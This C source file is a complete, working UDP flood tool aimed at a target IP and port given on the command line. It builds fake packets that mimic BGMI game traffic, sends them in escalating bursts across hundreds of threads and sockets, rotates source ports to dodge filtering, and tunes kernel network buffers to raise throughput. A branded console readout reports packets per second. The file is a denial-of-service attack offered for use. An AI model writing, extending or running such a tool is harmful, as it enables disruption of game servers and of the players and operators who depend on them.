#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>
#include <sys/time.h>

#define BUFFER_COUNT 2048
#define FLOOD_SOCKETS 384
#define MIN_PACKET_SIZE 20
#define MAX_PACKET_SIZE 128
#define MIN_THREADS 50
#define MAX_THREADS 999
#define MIN_ATTACK_TIME 5
#define MAX_ATTACK_TIME 300
#define MAX_RETRY_ATTEMPTS 3
#define BATCH_UPDATE_COUNT 7500
#define BASE_BURST_SIZE 100
#define MAX_BURST_SIZE 400

char *TARGET_IP;
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;

struct sockaddr_in target_addr;

void optimize_kernel() {
#ifdef __linux__
    system("sysctl -w net.core.wmem_max=1610612736 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_default=100663296 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_max_backlog=3000000 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_mem='100663296 100663296 100663296' >/dev/null 2>&1");
#endif
}

void set_sock_buf(int sock) {
    int buf = 100663296;
    int rbuf = 50331648;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rbuf, sizeof(rbuf));
}

unsigned int fast_rand(unsigned int *seed) {
    *seed = (*seed * 1103515245 + 12345);
    return *seed;
}

void create_bgmi_packet(char *buf, int size, int pattern_type, int thread_id, int seq, unsigned int seed) {
    memset(buf, 0, size);
    
    if (size < MIN_PACKET_SIZE) size = MIN_PACKET_SIZE;
    if (size > MAX_PACKET_SIZE) size = MAX_PACKET_SIZE;
    
    switch(pattern_type % 4) {
        case 0: {
            unsigned int magic = 0xDEADBEEF ^ (thread_id * 1111);
            unsigned int session_id = (thread_id * 1000) + (seq % 1000);
            unsigned int timestamp = time(NULL) + thread_id;
            
            memcpy(buf, &magic, 4);
            memcpy(buf + 4, &session_id, 4);
            memcpy(buf + 8, &seq, 4);
            memcpy(buf + 12, &timestamp, 4);
            
            buf[16] = 0xC0;
            buf[17] = thread_id & 0xFF;
            buf[18] = 0x80;
            buf[19] = (seq >> 8) & 0xFF;
            
            int max_i = size - 4;
            int start_i = 20;
            if (max_i > start_i) {
                for (int i = start_i; i < max_i; i++) {
                    buf[i] = fast_rand(&seed) & 0xFF;
                }
            }
            
            if (size >= 22) {
                unsigned short checksum = size ^ thread_id ^ (seq & 0xFFFF);
                memcpy(buf + size - 4, &checksum, 2);
            }
            break;
        }
        case 1: {
            buf[0] = 0xAB;
            buf[1] = 0xCD;
            buf[2] = pattern_type;
            buf[3] = size;
            
            unsigned int player_id = 1000000 + (thread_id * 10000) + seq;
            memcpy(buf + 4, &player_id, 4);
            
            if (size >= 12) {
                unsigned int game_time = seq % 1800;
                memcpy(buf + 8, &game_time, 4);
            }
            
            if (size >= 16) {
                buf[12] = 0x01;
                buf[13] = thread_id & 0xFF;
                buf[14] = 0x03;
                buf[15] = (seq >> 16) & 0xFF;
            }
            
            if (size >= 28) {
                int pos_x = 500 + ((thread_id * 17 + seq) % 4000);
                int pos_y = 500 + ((thread_id * 23 + seq) % 4000);
                int pos_z = 100 + ((thread_id * 29 + seq) % 200);
                
                memcpy(buf + 16, &pos_x, 4);
                memcpy(buf + 20, &pos_y, 4);
                memcpy(buf + 24, &pos_z, 4);
            }
            
            if (size >= 30) {
                buf[28] = 0x80;
                buf[29] = (seq >> 8) & 0xFF;
            }
            
            if (size >= 34) {
                int health = 100 - ((thread_id + seq) % 80);
                memcpy(buf + 30, &health, 4);
            }
            
            if (size >= 38) {
                int ammo = 30 - ((thread_id * 2 + seq) % 25);
                memcpy(buf + 34, &ammo, 4);
            }
            
            int max_i = size - 2;
            int start_i = 38;
            if (max_i > start_i && size >= 40) {
                for (int i = start_i; i < max_i; i++) {
                    buf[i] = fast_rand(&seed) & 0xFF;
                }
            }
            
            if (size >= 22) {
                unsigned short crc = (size * thread_id) ^ seq;
                memcpy(buf + size - 2, &crc, 2);
            }
            break;
        }
        case 2: {
            buf[0] = 0x56;
            buf[1] = 0x4F;
            buf[2] = thread_id & 0xFF;
            buf[3] = 0x43;
            
            if (size >= 8) {
                unsigned int voice_id = (thread_id * 100000) + seq;
                memcpy(buf + 4, &voice_id, 4);
            }
            
            if (size >= 14) {
                buf[8] = 0x01;
                buf[9] = pattern_type;
                
                int timestamp = (time(NULL) * 1000) + thread_id + seq;
                memcpy(buf + 10, &timestamp, 4);
            }
            
            if (size >= 16) {
                buf[14] = 0x7F;
                buf[15] = (seq >> 8) & 0xFF;
            }
            
            int max_i = size - 8;
            int start_i = 16;
            if (max_i > start_i && size >= 24) {
                for (int i = start_i; i < max_i; i++) {
                    buf[i] = (fast_rand(&seed) % 256) - 128;
                }
            }
            
            if (size >= 24) {
                buf[size - 8] = 0xAA ^ (thread_id & 0xFF);
                buf[size - 7] = 0xBB ^ ((thread_id >> 8) & 0xFF);
                buf[size - 6] = 0xCC ^ (seq & 0xFF);
                buf[size - 5] = 0xDD ^ ((seq >> 8) & 0xFF);
            }
            break;
        }
        case 3: {
            buf[0] = 0x4D;
            buf[1] = thread_id & 0xFF;
            buf[2] = 0x54;
            buf[3] = 0x43;
            
            if (size >= 8) {
                unsigned int match_id = 500000 + (thread_id * 1000) + seq;
                memcpy(buf + 4, &match_id, 4);
            }
            
            if (size >= 10) {
                buf[8] = (thread_id % 50) + 1;
                buf[9] = pattern_type;
            }
            
            if (size >= 22) {
                int zone_x = 1000 + ((thread_id * 37 + seq) % 3000);
                int zone_y = 1000 + ((thread_id * 41 + seq) % 3000);
                int zone_radius = 500 + ((thread_id * 43 + seq) % 1500);
                
                memcpy(buf + 10, &zone_x, 4);
                memcpy(buf + 14, &zone_y, 4);
                memcpy(buf + 18, &zone_radius, 4);
            }
            
            if (size >= 26) {
                buf[22] = 0x01;
                buf[23] = thread_id & 0xFF;
                buf[24] = seq & 0xFF;
            }
            
            if (size >= 30) {
                int remaining_time = 1200 - ((thread_id * 7 + seq) % 600);
                memcpy(buf + 25, &remaining_time, 4);
            }
            
            int max_i = size - 4;
            int start_i = 29;
            if (max_i > start_i && size >= 33) {
                for (int i = start_i; i < max_i; i++) {
                    buf[i] = fast_rand(&seed) & 0xFF;
                }
            }
            
            if (size >= 24) {
                unsigned int footer = 0x12345678 ^ (thread_id * 1111) ^ seq;
                memcpy(buf + size - 4, &footer, 4);
            }
            break;
        }
    }
}

int bind_random_port(int sock) {
    struct sockaddr_in src_addr;
    int attempts = 0;
    
    while (attempts < MAX_RETRY_ATTEMPTS) {
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(1024 + (rand() % 64511));
        src_addr.sin_addr.s_addr = INADDR_ANY;
        
        if (bind(sock, (struct sockaddr*)&src_addr, sizeof(src_addr)) == 0) {
            return 1;
        }
        attempts++;
    }
    return 0;
}

void *direct_attack(void *arg) {
    int thread_idx = *((int *)arg);
    int socks[FLOOD_SOCKETS];
    char *packets[FLOOD_SOCKETS];
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = -1;
        packets[i] = NULL;
    }
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) continue;
        
        int opt = 1;
        setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        setsockopt(socks[i], SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
        set_sock_buf(socks[i]);
        
        fcntl(socks[i], F_SETFL, O_NONBLOCK);
        
        if (bind_random_port(socks[i])) {
            packets[i] = malloc(PACKET_SIZE);
            if (!packets[i]) {
                close(socks[i]);
                socks[i] = -1;
                packets[i] = NULL;
            }
        } else {
            close(socks[i]);
            socks[i] = -1;
            packets[i] = NULL;
        }
    }
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    int seq_counter = thread_idx * 10000;
    int port_change_counter = 0;
    unsigned int seed = (thread_idx * 1234567) ^ time(NULL);
    int adaptive_burst = BASE_BURST_SIZE;
    
    while (!atomic_load(&stop_signal)) {
        int pattern = (seq_counter / 50) % 4;
        
        for (int i = 0; i < FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            if (socks[i] < 0 || packets[i] == NULL) continue;
            
            create_bgmi_packet(packets[i], PACKET_SIZE, pattern, thread_idx + 1000, seq_counter, seed);
            
            int sent_this_burst = 0;
            for (int burst = 0; burst < adaptive_burst && !atomic_load(&stop_signal); burst++) {
                int ret = sendto(socks[i], packets[i], PACKET_SIZE, MSG_DONTWAIT,
                                (struct sockaddr*)&target_addr, sizeof(target_addr));
                
                if (ret > 0) {
                    local_packets++;
                    local_bytes += PACKET_SIZE;
                    seq_counter++;
                    sent_this_burst++;
                }
            }
            
            if (sent_this_burst == adaptive_burst) {
                if (adaptive_burst < MAX_BURST_SIZE) adaptive_burst += 4;
            }
            
            if (local_packets >= BATCH_UPDATE_COUNT) {
                atomic_fetch_add(&total_packets, local_packets);
                atomic_fetch_add(&total_bytes, local_bytes);
                local_packets = 0;
                local_bytes = 0;
            }
            
            port_change_counter++;
            if (port_change_counter >= 600) {
                bind_random_port(socks[i]);
                port_change_counter = 0;
            }
        }
        
        if (seq_counter % 500 == 0) {
            sched_yield();
        }
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0) {
            close(socks[i]);
        }
        if (packets[i] != NULL) {
            free(packets[i]);
        }
    }
    
    return NULL;
}

void *attack_thread(void *arg) {
    int tid = *((int *)arg);
    
#ifdef __linux__
    cpu_set_t cs;
    CPU_ZERO(&cs);
    int cpus = sysconf(_SC_NPROCESSORS_ONLN);
    if (cpus > 0) {
        CPU_SET(tid % cpus, &cs);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cs);
    }
#endif
    
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return NULL;
    
    int o = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &o, sizeof(o));
    setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &o, sizeof(o));
    set_sock_buf(s);
    fcntl(s, F_SETFL, O_NONBLOCK);
    
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(1024 + (rand() % 64511));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
        close(s);
        return NULL;
    }
    
    char *packet = malloc(PACKET_SIZE);
    if (!packet) {
        close(s);
        return NULL;
    }
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    int seq_local = tid * 5000;
    int port_change = 0;
    unsigned int seed = (tid * 7654321) ^ time(NULL);
    int adaptive_burst = BASE_BURST_SIZE;
    struct timeval last_send_time;
    gettimeofday(&last_send_time, NULL);
    
    int warmup_packets = 4;
    while (warmup_packets > 0 && !atomic_load(&stop_signal)) {
        create_bgmi_packet(packet, PACKET_SIZE, 0, tid, seq_local, seed);
        sendto(s, packet, PACKET_SIZE, MSG_DONTWAIT,
               (struct sockaddr *)&target_addr, sizeof(target_addr));
        usleep(12000);
        seq_local++;
        warmup_packets--;
    }
    
    while (!atomic_load(&stop_signal)) {
        int pattern = (seq_local / 75) % 4;
        create_bgmi_packet(packet, PACKET_SIZE, pattern, tid, seq_local, seed);
        
        int sent_this_burst = 0;
        for (int burst = 0; burst < adaptive_burst && !atomic_load(&stop_signal); burst++) {
            int ret = sendto(s, packet, PACKET_SIZE, MSG_DONTWAIT,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
            
            if (ret > 0) {
                local_packets++;
                local_bytes += PACKET_SIZE;
                seq_local++;
                sent_this_burst++;
                
                port_change++;
                if (port_change >= 25) {
                    src_addr.sin_port = htons(1024 + (rand() % 64511));
                    bind(s, (struct sockaddr*)&src_addr, sizeof(src_addr));
                    port_change = 0;
                }
            }
        }
        
        if (sent_this_burst == adaptive_burst) {
            if (adaptive_burst < MAX_BURST_SIZE) adaptive_burst += 3;
        }
        
        struct timeval current_time;
        gettimeofday(&current_time, NULL);
        long elapsed_us = (current_time.tv_sec - last_send_time.tv_sec) * 1000000 + 
                         (current_time.tv_usec - last_send_time.tv_usec);
        
        if (elapsed_us < 280) {
            usleep(280 - elapsed_us);
        }
        gettimeofday(&last_send_time, NULL);
        
        if (local_packets >= BATCH_UPDATE_COUNT) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
        
        if (seq_local % 1000 == 0) {
            sched_yield();
        }
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    free(packet);
    close(s);
    return NULL;
}

void *stats_monitor(void *arg) {
    sleep(1);
    
    printf("\n🔥 MR.X FATHER OF TG 🔥\n\n");
    printf("🎯 Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("⏰ Time: %ds | 📦 Packet: %d bytes\n", ATTACK_TIME, PACKET_SIZE);
    printf("👥 Threads: %d\n\n", THREAD_COUNT);
    
    unsigned long long prev_packets = atomic_load(&total_packets);
    unsigned long long prev_bytes = atomic_load(&total_bytes);
    unsigned long long current_peak = 0;
    
    int elapsed = 1;
    
    while (elapsed <= ATTACK_TIME && !atomic_load(&stop_signal)) {
        sleep(1);
        
        unsigned long long curr_packets = atomic_load(&total_packets);
        unsigned long long curr_bytes = atomic_load(&total_bytes);
        
        unsigned long long pps = curr_packets - prev_packets;
        unsigned long long bytes_diff = curr_bytes - prev_bytes;
        
        if (pps > atomic_load(&peak_pps)) {
            atomic_store(&peak_pps, pps);
        }
        
        if (pps > current_peak) {
            current_peak = pps;
        }
        
        double megabytes = bytes_diff / (1024.0 * 1024.0);
        printf("🔥  PPS: %lluK | Peak: %lluK | %.1fMB\n", pps/1000, current_peak/1000, megabytes);
        
        prev_packets = curr_packets;
        prev_bytes = curr_bytes;
        elapsed++;
    }
    
    unsigned long long total_p = atomic_load(&total_packets);
    unsigned long long total_b = atomic_load(&total_bytes);
    
    if (ATTACK_TIME > 0) {
        double avg_pps = total_p / (double)ATTACK_TIME;
        double total_mb = total_b / (1024.0 * 1024.0);
        
        printf("\n🚀 MR.X NEVER END 🚀\n\n");
        printf("✅ Total Packets: %llu\n", total_p);
        printf("🚀 AVERAGE PPS: %.0fK\n", avg_pps/1000);
        printf("💾 Total Data: %.2fGB\n", total_mb/1024.0);
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (ATTACK_TIME < MIN_ATTACK_TIME) ATTACK_TIME = MIN_ATTACK_TIME;
    if (ATTACK_TIME > MAX_ATTACK_TIME) ATTACK_TIME = MAX_ATTACK_TIME;
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    if (THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("Invalid IP address\n");
        return 1;
    }
    
    printf("Target: %s:%d | Time: %ds\n", TARGET_IP, TARGET_PORT, ATTACK_TIME);
    printf("Packet: %d bytes | Threads: %d\n", PACKET_SIZE, THREAD_COUNT);
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    srand(tv.tv_usec ^ getpid() ^ (time(NULL) << 16));
    
    optimize_kernel();
    
    for (int warm = 0; warm < 2; warm++) {
        int warm_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (warm_sock >= 0) {
            char warm_pkt[48];
            memset(warm_pkt, 0x88 + warm, 48);
            
            for (int p = 0; p < 8; p++) {
                sendto(warm_sock, warm_pkt, 48, MSG_DONTWAIT,
                       (struct sockaddr*)&target_addr, sizeof(target_addr));
                usleep(125000);
            }
            close(warm_sock);
        }
        usleep(50000);
    }
    
    int direct_thread_id = 999999;
    pthread_t direct_thread;
    pthread_create(&direct_thread, NULL, direct_attack, &direct_thread_id);
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *tids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !tids) {
        atomic_store(&stop_signal, 1);
        pthread_join(direct_thread, NULL);
        return 1;
    }
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = -1;
    }
    
    printf("Created %d attack threads\n", THREAD_COUNT);
    
    int threads_to_start;
    if (THREAD_COUNT > 90) {
        threads_to_start = 90;
    } else {
        threads_to_start = THREAD_COUNT * 2 / 3;
        if (threads_to_start < 1) threads_to_start = 1;
    }
    
    for (int i = 0; i < threads_to_start; i++) {
        tids[i] = i;
        pthread_create(&threads[i], NULL, attack_thread, &tids[i]);
        usleep(3000 + (rand() % 9000));
    }
    
    int remaining_threads = THREAD_COUNT - threads_to_start;
    if (remaining_threads > 0) {
        int delay_ms = (ATTACK_TIME > 120) ? 1200 : 600;
        usleep(delay_ms * 1000);
    }
    
    for (int i = threads_to_start; i < THREAD_COUNT; i++) {
        tids[i] = i;
        pthread_create(&threads[i], NULL, attack_thread, &tids[i]);
        usleep(1000 + (rand() % 4000));
    }
    
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    sleep(ATTACK_TIME);
    
    atomic_store(&stop_signal, 1);
    usleep(500000);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (tids[i] != -1) {
            pthread_join(threads[i], NULL);
        }
    }
    
    pthread_join(direct_thread, NULL);
    pthread_join(monitor_thread, NULL);
    
    free(threads);
    free(tids);
    
    printf("Cleanup complete\n");
    
    return 0;
}